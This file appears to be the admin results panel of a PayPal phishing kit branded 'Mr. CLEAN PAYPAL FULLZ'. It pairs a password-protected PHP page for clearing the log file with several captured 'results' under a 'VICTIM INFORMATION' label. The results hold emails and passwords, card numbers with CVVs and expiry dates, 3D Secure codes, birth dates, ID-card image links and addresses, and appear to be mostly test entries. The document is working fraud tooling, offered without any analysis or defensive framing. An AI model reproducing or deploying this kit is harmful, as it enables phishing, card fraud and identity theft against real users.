<?php
include 'password_protect.php';
if (isset($_POST['submit'])){
$file = 'FULLZ.php';

    if (file_exists($file)) {
        unlink($file);
    } else {
        echo "File not found."; 
    }

$file_code = file_get_contents("clear_file.txt");

$file_open = fopen($file, 'a+') or die("Can't open file.");
fwrite($file_open, $file_code);
fclose($file_open);
header('Location: '.$_SERVER['REQUEST_URI']);
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>PAYPAL RESULT</title>
<style>
body, html {
    height: 100%;
    margin: 0;
}

body {
    /* The image used */
    background-image: url("http://oi67.tinypic.com/fc0f87.jpg");

    /* Full height */
    height: 100%; 

    /* Center and scale the image nicely */
    background-position: center;
    background-size: cover;
}
</style>
<style>
.button {
    display: inline-block;
    text-align: center;
    vertical-align: middle;
    padding: 15px 24px;
    border: 1px solid #2f27a1;
    border-radius: 8px;
    background: #4a92ff;
    background: -webkit-gradient(linear, left top, left bottom, from(#4a92ff), to(#263d99));
    background: -moz-linear-gradient(top, #4a92ff, #263d99);
    background: linear-gradient(to bottom, #4a92ff, #263d99);
    -webkit-box-shadow: #ff5959 0px 0px 40px 0px;
    -moz-box-shadow: #ff5959 0px 0px 40px 0px;
    box-shadow: #ff5959 0px 0px 40px 0px;
    font: normal normal bold 20px arial;
    color: #ffffff;
    text-decoration: none;
}
.button:hover,
.button:focus {
    border: 1px solid #4b3eff;
    background: #59afff;
    background: -webkit-gradient(linear, left top, left bottom, from(#59afff), to(#2e49b8));
    background: -moz-linear-gradient(top, #59afff, #2e49b8);
    background: linear-gradient(to bottom, #59afff, #2e49b8);
    color: #ffffff;
    text-decoration: none;
}
.button:active {
    background: #2c5899;
    background: -webkit-gradient(linear, left top, left bottom, from(#2c5899), to(#263d99));
    background: -moz-linear-gradient(top, #2c5899, #263d99);
    background: linear-gradient(to bottom, #2c5899, #263d99);
}
.button:before{
    content:  "\0000a0";
    display: inline-block;
    height: 24px;
    width: 24px;
    line-height: 24px;
    margin: 0 4px -6px -4px;
    position: relative;
    top: 0px;
    left: 0px;
    background: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAEx0lEQVRIia2VfWhVdRjHP/ecc7frvXvVtbeYzusLy5fJjHxBSVkGUkynJf4ziJQCq1mJEYJJEtEfEQUGEUqiQVR/aC++FtV0c7pw0ticOt3ddvd2d7fde3ffz73nnF9/nDO9hEmDHng48OP5fV+e5+H8ZGYY9QspXlfG6ifymSNpxMdUkjPFeGQ0vVVyXIw2C6P3rAg2faR2fr61+fud2bvKHDj+F4JfGsu+E7EhISKDQkSGhIj7hBi5JHqPbbv1aS3r/1kvzZhBCFBDVgYh5gd7Ie5tH1a9cuj9306+6NyVWa7M3IMBqTDoBiBMQpMZ16JNWS806l+GIh/49l7kHIA8U/iGFWKHOz+y1KZOQnYe6BroCdCToMWxF8yVKnKiz7Zdu/PVYIyEXF1EztPlLOwOMGlKenRsmZ/e4fJ3Lo12XcbmuUD27DngKAQtDloS0jFyy+a5SoJX9G9uqL/LR7ay9+CBhh92b3hs90s1tlWbK6by1ZiI3Q4SfBjhunlsyHOwTFGwJ5MqmudPXGXlYHeCljDdCLCl/BXHzg9+Yft6O4cb3nz9EK55Jl4qSHrCYwx6vf1To4Otnr6Ri8fbROvZXjwWx2ygsqqIqlef5OXnFlFb4S6VnOv3gK5bkgTqWBeb955ersRT6AQ8ILnuC7YXzpPcs+e7qTHcNVqooW7HoDE0MnwvMuFrudkz/uvRZlqavNzYd5Fz3jDvvZvn2+dUvWBzmkPXIdthZ0ERc5WbfnpEaABbbgUI40FXJGEusSTIKiqT3MWPL0YyFq+ondq1fafPaG/vurD+cPj5z65yePNyNpYagZWgmgSGDSbbkGQU5coQt6OBcXKLgyaBTZi7lbF+5keAAUjgsAWkrMlwFeaah6W8WbeR1JXoqgke6AZ1AGRQun0M+QPhUK4aKADjAbicAc60GwMxchf/tTEiMTTAOPgMS1atLdmCMQV6GsL3QA2ABFoaQ0kYhCZDqndBsLuAnCJANl1IwsS/70RH7+3H1x5nRCV8ooOPjzZQW19XeDy/ODsHtRcS45gDgLgfhsNMKIAWiOMhOVqN4QOnCxxOsNlBsmUsqI4oBmeNgjEmAgfXyO+459sXy0oaUnfN9trNFpKCgT5CV4fwKABjUbpRqEcRQBT0KGiAJJkp28AGSh4UFsLqpVQi0iBSpstsU/h0Jm5Ch5/LkaTpgA4fHQKwKdbYFEw1imGldSZbabMSzMEbFrgBWieMDKOd7OAIYCgAl/roSajgzLMA7KZNBJCTcSZbRJn/YGERqJBuBb8HzvRz8vwtLmOV0zXKkD9CqLKUAuwgpiDQbra1sBLk5UBJBomU4UAF0QfRFggmodlP076fOWBJNAlSOqHxMN5KOwViFMa7YVgQlUGJ9uNweSCnHLKrQCoFHCA00Ccg3gNTXkgJjDP9nNr/E28bBv5pg9PvgTY1yT29i2r/OPRp+PZfYE8gRvyNdTSuLWdjSYAcpQ2UWSBbm4wG0TTGjQDdx65z5Ewn3wLhjAY+eHCGE3SNhdj+V5yu106ze2CS64DReIqWHAdL6paxafVcnipyUZyloERUQnfG6fmxkz/u+GgFJqxpPDzqqlnzST0nnFm4/7UIHNbY8wAnM3wRJSBrJhf+S/wNbS430494JFMAAAAASUVORK5CYII=") no-repeat left center transparent;
    background-size: 100% 100%;
}
.pointer {cursor: pointer;}
</style>
<meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
    <form method="POST">
    <p><center>
        <input type="hidden" name="submit">
        <button typr="submit" class="button pointer">Clear Now!</button>
    </center></p>
    </form>
</body>
</html><html>
<html><body>
        <div style='font-size: 13px;font-family:monospace;font-weight:700;'><br>
        ########################## <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'>Mr. CLEAN PAYPAL FULLZ</font> [+]</font> ###########################<br>
        ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> LOGIN INFORMATION </font> [+]</font> #############################<br>
        <font style='color:#9c0000;'>[+]</font> <b>DEAR, <font color='#cc1414'>Mr. CLEAN</font> THIS IS YOUR LOGIN RESULT ENJOY !</b> <br>
        <font style='color:#9c0000;'>[+]</font> [Email] = <font style='color:#0070ba;'>hdfg@dfgj.dfg</font><br>
        <font style='color:#9c0000;'>[+]</font> [Password] = <font style='color:#0070ba;'>shdfjsdfh</font><br>
        ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> BILLING INFORMATION </font> [+]</font> ###########################<br>
        <font style='color:#9c0000;'>[+]</font> [City] = <font style='color:#0070ba;'></font><br>
        <font style='color:#9c0000;'>[+]</font> [State]   = <font style='color:#0070ba;'>()</font><br>
       <font style='color:#9c0000;'>[+]</font> [Zip Code] = <font style='color:#0070ba;'></font><br>
        ############################## <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> VICTIM INFORMATION </font> [+]</font> ###########################<br>
        <font style='color:#9c0000;'>[+]</font> [IP INFO] = <font style='color:#0070ba;'>https://db-ip.com/::1</font><br>
       <font style='color:#9c0000;'>[+]</font> [TIME/DATE] = <font style='color:#0070ba;'>21:34:40 15/09/2018</font><br>
        <font style='color:#9c0000;'>[+]</font> [BROWSER] = <font style='color:#0070ba;'>Chrome On Windows 10</font><br>
        <font style='color:#9c0000;'>[+]</font> [ALERT!] = <font style='color:#0070ba;'>Our YouTube Channel : </font><br>
        ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> Mr. CLEAN PAYPAL FULLZ </font> [+]</font> ########################<br>
        </div></body></html><html><body>
        <div style='font-size: 13px;font-family:monospace;font-weight:700;'><br>
        ########################## <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'>Mr. CLEAN PAYPAL FULLZ</font> [+]</font> ###########################<br>
        ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> LOGIN INFORMATION </font> [+]</font> #############################<br>
        <font style='color:#9c0000;'>[+]</font> DEAR, <font color='#9c0000'>Mr. CLEAN</font> THIS IS YOUR CC RESULT ENJOY ! <br>
        <font style='color:#9c0000;'>[+]</font> [Email] = <font style='color:#0070ba;'>hdfg@dfgj.dfg</font><br>
        <font style='color:#9c0000;'>[+]</font> [Password] = <font style='color:#0070ba;'>shdfjsdfh</font><br>
        ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> CARDING INFORMATION </font> [+]</font> ###########################<br>
        <font style='color:#9c0000;'>[+]</font> [Bank Name] = <font style='color:#0070ba;'>JPMORGAN CHASE BANK, N.A.</font><br>
        <font style='color:#9c0000;'>[+]</font> [Cardholder's Name] = <font style='color:#0070ba;'>DFKJDFGK DFJDFGK</font><br>
        <font style='color:#9c0000;'>[+]</font> [VISA Card Number] = <font style='color:#0070ba;'>4111111111111111 (VISA  )</font><br>
        <font style='color:#9c0000;'>[+]</font> [Card Security Code]    = <font style='color:#0070ba;'>999</font><br>
        <font style='color:#9c0000;'>[+]</font> [Expiration Date] = <font style='color:#0070ba;'>11/2019</font><br>
        ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> BILLING INFORMATION </font> [+]</font> ###########################<br>
        <font style='color:#9c0000;'>[+]</font> [Full Name] = <font style='color:#0070ba;'>Dfkjdfgk Dfjdfgk (First name - Last name)</font><br>
        <font style='color:#9c0000;'>[+]</font> [Full Address line] = <font style='color:#0070ba;'>Dhgdfgj D, Dfgjd, Fgdfgjd, Fgkdfj</font><br>
        <font style='color:#9c0000;'>[+]</font> [Country Name] = <font style='color:#0070ba;'> & THE VISA CARD MADE IN United States of America</font><br>
        ############################## <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> VICTIM INFORMATION </font> [+]</font> ###########################<br>
        <font style='color:#9c0000;'>[+]</font> [IP INFO] = <font style='color:#0070ba;'>https://db-ip.com/::1</font><br>
        <font style='color:#9c0000;'>[+]</font> [TIME/DATE]    = <font style='color:#0070ba;'>21:35:24 15/09/2018</font><br>
        <font style='color:#9c0000;'>[+]</font> [BROWSER] = <font style='color:#0070ba;'>Chrome On Windows 10</font><br>
        ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> Mr. CLEAN PAYPAL FULLZ </font> [+]</font> ########################<br>
        </div></body></html><html><body>
        <br>
        <div style='font-size: 13px;font-family:monospace;font-weight:700;'>
        ########################## <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'>Mr. CLEAN PAYPAL FULLZ</font> [+]</font> ###########################<br>
        ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> CARDING INFORMATION </font> [+]</font> ###########################<br>
		<font style='color:#9c0000;'>[+]</font> DEAR, <font color='#9c0000'>Mr. CLEAN</font> THIS IS YOUR VBV RESULT ENJOY ! <br>
        <font style='color:#9c0000;'>[+]</font> [Bank Name] = <font style='color:#0070ba;'>JPMORGAN CHASE BANK, N.A.</font><br>
        <font style='color:#9c0000;'>[+]</font> [Cardholder's Name] = <font style='color:#0070ba;'>DFKJDFGK DFJDFGK</font><br>
        <font style='color:#9c0000;'>[+]</font> [VISA Card Number] = <font style='color:#0070ba;'>4111111111111111 (VISA  )</font><br>
        <font style='color:#9c0000;'>[+]</font> [Card Security Code]	= <font style='color:#0070ba;'>999</font><br>
        <font style='color:#9c0000;'>[+]</font> [Expiration Date] = <font style='color:#0070ba;'>11/2019</font><br>
        ############################### <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> VBV INFORMATION </font> [+]</font> #############################<br>
        <font style='color:#9c0000;'>[+]</font> [Date of Birth]  = <font style='color:#0070ba;'>11/11/1966 (DD/MM/YYYY)</font><br>
        <font style='color:#9c0000;'>[+]</font> [3D Secure]      = <font style='color:#0070ba;'>6666666666666</font><br>
        ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> BILLING INFORMATION </font> [+]</font> ###########################<br>
        <font style='color:#9c0000;'>[+]</font> [Full Address line] = <font style='color:#0070ba;'>Dhgdfgj D, Dfgjd, Fgdfgjd, Fgkdfj</font><br>
        <font style='color:#9c0000;'>[+]</font> [Country Name] = <font style='color:#0070ba;'> & THE VISA CARD MADE IN United States of America</font><br>
        ############################## <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> VICTIM INFORMATION </font> [+]</font> ###########################<br>
        <font style='color:#9c0000;'>[+]</font> [IP INFO] = <font style='color:#0070ba;'>https://db-ip.com/::1</font><br>
        <font style='color:#9c0000;'>[+]</font> [TIME/DATE] = <font style='color:#0070ba;'>21:35:48 15/09/2018</font><br>
        <font style='color:#9c0000;'>[+]</font> [BROWSER] = <font style='color:#0070ba;'>Chrome On Windows 10</font><br>
        ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> Mr. CLEAN PAYPAL FULLZ </font> [+]</font> ########################<br>
        </div></body></html><html><body>
        <div style='font-size: 13px;font-family:monospace;font-weight:700;'><br>
        ########################## <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'>Mr. CLEAN PAYPAL FULLZ</font> [+]</font> ###########################<br>
<font style='color:#9c0000;'>[+]</font> [ID CARD] = * ID IMG MIGHT NOT SHOW IN SOME EMAIL SERVICES LIKE: GMAIL!<br><img src='http://localhost/SPAM/PPL_V1_PRO/customer_center/customer-IDPP00C221/identity/A797XX666XX.acropo/1536753027120937209505.jpg' width='500px' hight='500px'></img><br>
<font style='color:#9c0000;'>[+]</font> [ID LINK] = <a href='http://localhost/SPAM/PPL_V1_PRO/customer_center/customer-IDPP00C221/identity/A797XX666XX.acropo/1536753027120937209505.jpg'>http://localhost/SPAM/PPL_V1_PRO/customer_center/customer-IDPP00C221/identity/A797XX666XX.acropo/1536753027120937209505.jpg</a><br>

        ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> BILLING INFORMATION </font> [+]</font> ###########################<br>
        <font style='color:#9c0000;'>[+]</font> [City] = <font style='color:#0070ba;'></font><br>
        <font style='color:#9c0000;'>[+]</font> [State]   = <font style='color:#0070ba;'>()</font><br>
       <font style='color:#9c0000;'>[+]</font> [Zip Code] = <font style='color:#0070ba;'></font><br>
        ############################## <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> VICTIM INFORMATION </font> [+]</font> ###########################<br>
        <font style='color:#9c0000;'>[+]</font> [IP INFO] = <font style='color:#0070ba;'>https://db-ip.com/::1</font><br>
       <font style='color:#9c0000;'>[+]</font> [TIME/DATE] = <font style='color:#0070ba;'>21:37:01 15/09/2018</font><br>
        <font style='color:#9c0000;'>[+]</font> [BROWSER] = <font style='color:#0070ba;'>Chrome On Windows 10</font><br>
        <font style='color:#9c0000;'>[+]</font> [ALERT!] = <font style='color:#0070ba;'>Our YouTube Channel : </font><br>
        ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> Mr. CLEAN PAYPAL FULLZ </font> [+]</font> #######################<br>
        </div></body></html><html><body>
        <div style='font-size: 13px;font-family:monospace;font-weight:700;'><br>
        ########################## <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'>Mr. CLEAN PAYPAL FULLZ</font> [+]</font> ###########################<br>
<font style='color:#9c0000;'>[+]</font> [ID CARD] = * ID IMG MIGHT NOT SHOW IN SOME EMAIL SERVICES LIKE: GMAIL!<br><img src='http://localhost/SPAM/PPL_V1_PRO/customer_center/customer-IDPP00C523/identity/A797XX666XX.acropo/DlxMiHDV4AAhPZa.jpg' width='500px' hight='500px'></img><br>
<font style='color:#9c0000;'>[+]</font> [ID LINK] = <a href='http://localhost/SPAM/PPL_V1_PRO/customer_center/customer-IDPP00C523/identity/A797XX666XX.acropo/DlxMiHDV4AAhPZa.jpg'>http://localhost/SPAM/PPL_V1_PRO/customer_center/customer-IDPP00C523/identity/A797XX666XX.acropo/DlxMiHDV4AAhPZa.jpg</a><br>

        ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> BILLING INFORMATION </font> [+]</font> ###########################<br>
        <font style='color:#9c0000;'>[+]</font> [City] = <font style='color:#0070ba;'></font><br>
        <font style='color:#9c0000;'>[+]</font> [State]   = <font style='color:#0070ba;'>()</font><br>
       <font style='color:#9c0000;'>[+]</font> [Zip Code] = <font style='color:#0070ba;'></font><br>
        ############################## <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> VICTIM INFORMATION </font> [+]</font> ###########################<br>
        <font style='color:#9c0000;'>[+]</font> [IP INFO] = <font style='color:#0070ba;'>https://db-ip.com/::1</font><br>
       <font style='color:#9c0000;'>[+]</font> [TIME/DATE] = <font style='color:#0070ba;'>00:48:20 16/09/2018</font><br>
        <font style='color:#9c0000;'>[+]</font> [BROWSER] = <font style='color:#0070ba;'>Chrome On Windows 10</font><br>
        <font style='color:#9c0000;'>[+]</font> [ALERT!] = <font style='color:#0070ba;'>Our YouTube Channel : </font><br>
        ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> Mr. CLEAN PAYPAL FULLZ </font> [+]</font> #######################<br>
        </div></body></html><html><body>
        <div style='font-size: 13px;font-family:monospace;font-weight:700;'><br>
        ########################## <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'>Mr. CLEAN PAYPAL FULLZ</font> [+]</font> ###########################<br>
        ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> LOGIN INFORMATION </font> [+]</font> #############################<br>
        <font style='color:#9c0000;'>[+]</font> <b>DEAR, <font color='#cc1414'>Mr. CLEAN</font> THIS IS YOUR LOGIN RESULT ENJOY !</b> <br>
        <font style='color:#9c0000;'>[+]</font> [Email] = <font style='color:#0070ba;'>root@ewf.lkj</font><br>
        <font style='color:#9c0000;'>[+]</font> [Password] = <font style='color:#0070ba;'>rootroot</font><br>
        ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> BILLING INFORMATION </font> [+]</font> ###########################<br>
        <font style='color:#9c0000;'>[+]</font> [City] = <font style='color:#0070ba;'></font><br>
        <font style='color:#9c0000;'>[+]</font> [State]   = <font style='color:#0070ba;'>()</font><br>
       <font style='color:#9c0000;'>[+]</font> [Zip Code] = <font style='color:#0070ba;'></font><br>
        ############################## <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> VICTIM INFORMATION </font> [+]</font> ###########################<br>
        <font style='color:#9c0000;'>[+]</font> [IP INFO] = <font style='color:#0070ba;'>https://db-ip.com/::1</font><br>
       <font style='color:#9c0000;'>[+]</font> [TIME/DATE] = <font style='color:#0070ba;'>14:15:56 22/09/2018</font><br>
        <font style='color:#9c0000;'>[+]</font> [BROWSER] = <font style='color:#0070ba;'>Chrome On Windows 10</font><br>
        <font style='color:#9c0000;'>[+]</font> [ALERT!] = <font style='color:#0070ba;'>Our YouTube Channel : </font><br>
        ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> Mr. CLEAN PAYPAL FULLZ </font> [+]</font> ########################<br>
        </div></body></html><html><body>
        <div style='font-size: 13px;font-family:monospace;font-weight:700;'><br>
        ########################## <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'>Mr. CLEAN PAYPAL FULLZ</font> [+]</font> ###########################<br>
        ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> LOGIN INFORMATION </font> [+]</font> #############################<br>
        <font style='color:#9c0000;'>[+]</font> DEAR, <font color='#9c0000'>Mr. CLEAN</font> THIS IS YOUR CC RESULT ENJOY ! <br>
        <font style='color:#9c0000;'>[+]</font> [Email] = <font style='color:#0070ba;'>root@ewf.lkj</font><br>
        <font style='color:#9c0000;'>[+]</font> [Password] = <font style='color:#0070ba;'>rootroot</font><br>
        ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> CARDING INFORMATION </font> [+]</font> ###########################<br>
        <font style='color:#9c0000;'>[+]</font> [Bank Name] = <font style='color:#0070ba;'></font><br>
        <font style='color:#9c0000;'>[+]</font> [Cardholder's Name] = <font style='color:#0070ba;'>FUTURELY2000 FVDS</font><br>
        <font style='color:#9c0000;'>[+]</font> [ Card Number] = <font style='color:#0070ba;'>5213626279726685 (  )</font><br>
        <font style='color:#9c0000;'>[+]</font> [Card Security Code]    = <font style='color:#0070ba;'>434</font><br>
        <font style='color:#9c0000;'>[+]</font> [Expiration Date] = <font style='color:#0070ba;'>11/2232</font><br>
        ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> BILLING INFORMATION </font> [+]</font> ###########################<br>
        <font style='color:#9c0000;'>[+]</font> [Full Name] = <font style='color:#0070ba;'>Futurely2000 Fvds (First name - Last name)</font><br>
        <font style='color:#9c0000;'>[+]</font> [Full Address line] = <font style='color:#0070ba;'>St10, Greendale, Wi, 53129</font><br>
        <font style='color:#9c0000;'>[+]</font> [Country Name] = <font style='color:#0070ba;'> & THE  CARD MADE IN </font><br>
        ############################## <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> VICTIM INFORMATION </font> [+]</font> ###########################<br>
        <font style='color:#9c0000;'>[+]</font> [IP INFO] = <font style='color:#0070ba;'>https://db-ip.com/::1</font><br>
        <font style='color:#9c0000;'>[+]</font> [TIME/DATE]    = <font style='color:#0070ba;'>14:17:52 22/09/2018</font><br>
        <font style='color:#9c0000;'>[+]</font> [BROWSER] = <font style='color:#0070ba;'>Chrome On Windows 10</font><br>
        ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> Mr. CLEAN PAYPAL FULLZ </font> [+]</font> ########################<br>
        </div></body></html>